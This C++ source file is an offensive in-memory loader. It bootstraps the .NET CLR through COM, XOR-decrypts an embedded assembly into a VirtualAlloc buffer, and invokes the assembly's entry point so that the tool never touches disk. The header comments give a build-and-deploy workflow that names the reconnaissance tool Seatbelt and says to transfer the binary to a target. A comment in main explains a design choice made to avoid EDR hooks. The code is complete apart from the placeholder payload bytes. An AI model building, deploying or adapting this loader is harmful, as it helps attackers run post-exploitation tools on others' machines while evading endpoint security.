// loader_embedded.cpp — Assembly bytes baked into the binary at compile time
//
// Workflow:
//   1. python encrypt_payload.py xor Seatbelt.exe --format cs    (get the byte arrays)
//   2. Paste the arrays into the PAYLOAD SECTION below
//   3. Cross-compile:  x86_64-w64-mingw32-g++ -O2 -municode -static-libgcc -static-libstdc++ \
//                        -o seatbelt_loader.exe loader_embedded.cpp -loleaut32 -lole32
//   4. Transfer seatbelt_loader.exe to target and run
//
// The assembly never exists as a separate file. It lives XOR-encrypted inside the
// .data section of this PE and is decrypted into a VirtualAlloc'd buffer at runtime.

#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include <oleauto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _HDOMAINENUM_DEFINED
typedef void* HDOMAINENUM;
#define _HDOMAINENUM_DEFINED
#endif

// === COM GUIDs ===
static const GUID CLSID_CLRMetaHost =
    {0x9280188d, 0x0e8e, 0x4867, {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
static const GUID IID_ICLRMetaHost =
    {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
static const GUID IID_ICLRRuntimeInfo =
    {0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
static const GUID CLSID_CorRuntimeHost =
    {0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
static const GUID IID_ICorRuntimeHost =
    {0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

// === COM Interface Declarations ===
#undef INTERFACE
#define INTERFACE ICLRMetaHost
DECLARE_INTERFACE_(ICLRMetaHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetRuntime)(THIS_ LPCWSTR pwzVersion, REFIID riid, LPVOID* ppRuntime) PURE;
    STDMETHOD(GetVersionFromFile)(THIS_ LPCWSTR pwzFilePath, LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(EnumerateInstalledRuntimes)(THIS_ void** ppEnumerator) PURE;
    STDMETHOD(EnumerateLoadedRuntimes)(THIS_ HANDLE hndProcess, void** ppEnumerator) PURE;
    STDMETHOD(RequestRuntimeLoadedNotification)(THIS_ void* pCallbackFunction) PURE;
    STDMETHOD(QueryLegacyV2RuntimeBinding)(THIS_ REFIID riid, LPVOID* ppUnk) PURE;
    STDMETHOD(ExitProcess)(THIS_ INT32 iExitCode) PURE;
};
#undef INTERFACE
#define INTERFACE ICLRRuntimeInfo
DECLARE_INTERFACE_(ICLRRuntimeInfo, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetVersionString)(THIS_ LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(GetRuntimeDirectory)(THIS_ LPWSTR pwzBuffer, DWORD* pcchBuffer) PURE;
    STDMETHOD(IsLoaded)(THIS_ HANDLE hndProcess, BOOL* pbLoaded) PURE;
    STDMETHOD(LoadErrorString)(THIS_ UINT iResourceID, LPWSTR pwzBuffer, DWORD* pcchBuffer, LONG iLocaleID) PURE;
    STDMETHOD(LoadLibrary)(THIS_ LPCWSTR pwzDllName, HMODULE* phndModule) PURE;
    STDMETHOD(GetProcAddress)(THIS_ LPCSTR pszProcName, LPVOID* ppProc) PURE;
    STDMETHOD(GetInterface)(THIS_ REFCLSID rclsid, REFIID riid, LPVOID* ppUnk) PURE;
    STDMETHOD(IsLoadable)(THIS_ BOOL* pbLoadable) PURE;
    STDMETHOD(SetDefaultStartupFlags)(THIS_ DWORD dwStartupFlags, LPCWSTR pwzHostConfigFile) PURE;
    STDMETHOD(GetDefaultStartupFlags)(THIS_ DWORD* pdwStartupFlags, LPWSTR pwzHostConfigFile, DWORD* pcchHostConfigFile) PURE;
    STDMETHOD(BindAsLegacyV2Runtime)(THIS) PURE;
    STDMETHOD(IsStarted)(THIS_ BOOL* pbStarted, DWORD* pdwStartupFlags) PURE;
};
#undef INTERFACE
#define INTERFACE ICorRuntimeHost
DECLARE_INTERFACE_(ICorRuntimeHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(CreateLogicalThreadState)(THIS) PURE;
    STDMETHOD(DeleteLogicalThreadState)(THIS) PURE;
    STDMETHOD(SwitchInLogicalThreadState)(THIS_ DWORD* pFiberCookie) PURE;
    STDMETHOD(SwitchOutLogicalThreadState)(THIS_ DWORD** pFiberCookie) PURE;
    STDMETHOD(LocksHeldByLogicalThread)(THIS_ DWORD* pCount) PURE;
    STDMETHOD(MapFile)(THIS_ HANDLE hFile, HMODULE* hMapAddress) PURE;
    STDMETHOD(GetConfiguration)(THIS_ void** pConfiguration) PURE;
    STDMETHOD(Start)(THIS) PURE;
    STDMETHOD(Stop)(THIS) PURE;
    STDMETHOD(CreateDomain)(THIS_ LPCWSTR pwzFriendlyName, IUnknown* pIdentityArray, IUnknown** pAppDomain) PURE;
    STDMETHOD(GetDefaultDomain)(THIS_ IUnknown** pAppDomain) PURE;
    STDMETHOD(EnumDomains)(THIS_ HDOMAINENUM* hEnum) PURE;
    STDMETHOD(NextDomain)(THIS_ HDOMAINENUM hEnum, IUnknown** pAppDomain) PURE;
    STDMETHOD(CloseEnum)(THIS_ HDOMAINENUM hEnum) PURE;
    STDMETHOD(CreateDomainEx)(THIS_ LPCWSTR pwzFriendlyName, IUnknown* pSetup, IUnknown* pEvidence, IUnknown** pAppDomain) PURE;
    STDMETHOD(CreateDomainSetup)(THIS_ IUnknown** pAppDomainSetup) PURE;
    STDMETHOD(CreateEvidence)(THIS_ IUnknown** pEvidence) PURE;
    STDMETHOD(UnloadDomain)(THIS_ IUnknown* pAppDomain) PURE;
    STDMETHOD(CurrentDomain)(THIS_ IUnknown** pAppDomain) PURE;
};
#undef INTERFACE

typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);

static HRESULT DispatchCall(IDispatch* d, LPCOLESTR name, WORD flags, DISPPARAMS* p, VARIANT* r) {
    DISPID id;
    OLECHAR* n[] = { (OLECHAR*)name };
    HRESULT hr = d->GetIDsOfNames(IID_NULL, n, 1, LOCALE_SYSTEM_DEFAULT, &id);
    if (FAILED(hr)) return hr;
    return d->Invoke(id, IID_NULL, LOCALE_SYSTEM_DEFAULT, flags, p, r, NULL, NULL);
}

// ============================================================================
//  PAYLOAD SECTION — paste output from encrypt_payload.py here
// ============================================================================

// Example (replace with your actual encrypted assembly):
//
// python encrypt_payload.py xor Seatbelt.exe --format cs
//
// Then paste the output:

static unsigned char encryptedAssembly[] = {
    // PASTE ENCRYPTED BYTES HERE
    // 0xde, 0xad, 0xbe, 0xef, ...
    0x00  // placeholder — replace this
};
static unsigned int encryptedAssemblyLen = sizeof(encryptedAssembly);

static unsigned char xorKey[] = {
    // PASTE XOR KEY HERE
    // 0x41, 0x42, 0x43, ...
    0x00  // placeholder — replace this
};
static unsigned int xorKeyLen = sizeof(xorKey);

// Hardcoded arguments to pass to the assembly's Main(string[])
// Change these to whatever your tool needs, or set to NULL/0 for no args
static LPCWSTR hardcodedArgs[] = {
    // L"-group=all",
    // L"-outputfile=output.txt",
    NULL
};
static int hardcodedArgCount = 0;  // set to number of args above

// ============================================================================
//  XOR decrypt in-place
// ============================================================================

static void XorDecrypt(unsigned char* data, unsigned int len,
                       const unsigned char* key, unsigned int keyLen) {
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

// ============================================================================
//  Execute assembly from byte array
// ============================================================================

static int ExecuteAssembly(unsigned char* bytes, unsigned int len,
                           int argc, LPCWSTR* argv) {
    HRESULT hr;
    int result = 1;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown* pDomainThunk = NULL;
    IDispatch* pDomainDisp = NULL;
    BOOL started = FALSE;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    HMODULE hMscoree = LoadLibraryW(L"mscoree.dll");
    if (!hMscoree) goto cleanup;
    pfnCLRCreateInstance fnCreate = (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!fnCreate) goto cleanup;

    hr = fnCreate(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) goto cleanup;

    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) goto cleanup;

    BOOL loadable = FALSE;
    pRuntimeInfo->IsLoadable(&loadable);
    if (!loadable) goto cleanup;

    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) goto cleanup;

    hr = pRuntimeHost->Start();
    if (FAILED(hr)) goto cleanup;
    started = TRUE;

    hr = pRuntimeHost->CreateDomain(L"Loader", NULL, &pDomainThunk);
    if (FAILED(hr)) goto cleanup;

    hr = pDomainThunk->QueryInterface(IID_IDispatch, (void**)&pDomainDisp);
    if (FAILED(hr)) goto cleanup;

    {
        SAFEARRAYBOUND bounds = { len, 0 };
        SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);
        void* pvData = NULL;
        SafeArrayAccessData(psa, &pvData);
        memcpy(pvData, bytes, len);
        SafeArrayUnaccessData(psa);

        VARIANT vtArg;
        VariantInit(&vtArg);
        vtArg.vt = VT_ARRAY | VT_UI1;
        vtArg.parray = psa;

        DISPPARAMS loadParams = { &vtArg, NULL, 1, 0 };
        VARIANT vtAssembly;
        VariantInit(&vtAssembly);

        hr = DispatchCall(pDomainDisp, L"Load", DISPATCH_METHOD, &loadParams, &vtAssembly);
        SafeArrayDestroy(psa);
        if (FAILED(hr)) goto cleanup;

        IDispatch* pAsm = vtAssembly.pdispVal;
        DISPPARAMS noParams = { NULL, NULL, 0, 0 };
        VARIANT vtEP;
        VariantInit(&vtEP);
        hr = DispatchCall(pAsm, L"EntryPoint", DISPATCH_PROPERTYGET, &noParams, &vtEP);
        if (FAILED(hr) || !vtEP.pdispVal) { pAsm->Release(); goto cleanup; }

        IDispatch* pMethod = vtEP.pdispVal;

        VARIANT vtArgs;
        VariantInit(&vtArgs);
        if (argc > 0 && argv != NULL) {
            SAFEARRAYBOUND ab = { (ULONG)argc, 0 };
            SAFEARRAY* sa = SafeArrayCreate(VT_BSTR, 1, &ab);
            for (int i = 0; i < argc; i++) {
                long idx = i;
                BSTR b = SysAllocString(argv[i]);
                SafeArrayPutElement(sa, &idx, b);
                SysFreeString(b);
            }
            vtArgs.vt = VT_ARRAY | VT_BSTR;
            vtArgs.parray = sa;
        }

        SAFEARRAYBOUND pb = { 1, 0 };
        SAFEARRAY* psaP = SafeArrayCreate(VT_VARIANT, 1, &pb);
        long idx = 0;
        SafeArrayPutElement(psaP, &idx, &vtArgs);

        VARIANT invokeArgs[2];
        VariantInit(&invokeArgs[0]);
        invokeArgs[0].vt = VT_ARRAY | VT_VARIANT;
        invokeArgs[0].parray = psaP;
        VariantInit(&invokeArgs[1]);

        DISPPARAMS ip = { invokeArgs, NULL, 2, 0 };
        VARIANT vtR;
        VariantInit(&vtR);

        hr = DispatchCall(pMethod, L"Invoke", DISPATCH_METHOD, &ip, &vtR);
        result = SUCCEEDED(hr) ? 0 : 1;

        VariantClear(&vtR);
        SafeArrayDestroy(psaP);
        if (vtArgs.vt != VT_EMPTY) VariantClear(&vtArgs);
        pMethod->Release();
        pAsm->Release();
    }

cleanup:
    if (pDomainDisp) pDomainDisp->Release();
    if (pDomainThunk && pRuntimeHost) pRuntimeHost->UnloadDomain(pDomainThunk);
    if (pDomainThunk) pDomainThunk->Release();
    if (pRuntimeHost) { if (started) pRuntimeHost->Stop(); pRuntimeHost->Release(); }
    if (pRuntimeInfo) pRuntimeInfo->Release();
    if (pMetaHost) pMetaHost->Release();
    CoUninitialize();
    return result;
}

// ============================================================================
//  main — decrypt embedded payload and execute
// ============================================================================

int wmain(int argc, wchar_t* argv[]) {
    (void)argc; (void)argv;

    // Decrypt into a fresh buffer (don't modify .data section in place —
    // some EDR hooks page-fault on .data writes)
    unsigned char* cleartext = (unsigned char*)VirtualAlloc(
        NULL, encryptedAssemblyLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!cleartext) return 1;

    memcpy(cleartext, encryptedAssembly, encryptedAssemblyLen);
    XorDecrypt(cleartext, encryptedAssemblyLen, xorKey, xorKeyLen);

    int ret = ExecuteAssembly(cleartext, encryptedAssemblyLen,
                              hardcodedArgCount, hardcodedArgs);

    SecureZeroMemory(cleartext, encryptedAssemblyLen);
    VirtualFree(cleartext, 0, MEM_RELEASE);

    return ret;
}
